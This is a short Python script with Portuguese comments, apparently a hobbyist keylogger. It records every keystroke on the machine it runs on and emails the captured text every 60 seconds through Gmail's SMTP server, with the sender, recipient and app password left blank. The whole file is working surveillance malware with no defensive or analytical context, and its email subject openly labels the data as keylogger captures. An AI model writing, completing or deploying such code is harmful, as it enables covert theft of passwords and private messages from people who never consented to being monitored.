from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

EMAIL_ORIGEM = "@gmail.com"
EMAIL_DESTINO = "@gmail.com"
SENHA_EMAIL = "                        "  # App password do Gmail

def enviar_email():
    global log
    if log:  # Só cria msg se houver conteúdo
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)  # Corrigido host
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)

        log = ""  # Resetar log somente após envio

    Timer(60, enviar_email).start()  # Executa novamente após 60 segundos

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

# Inicia listener do teclado e envio periódico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
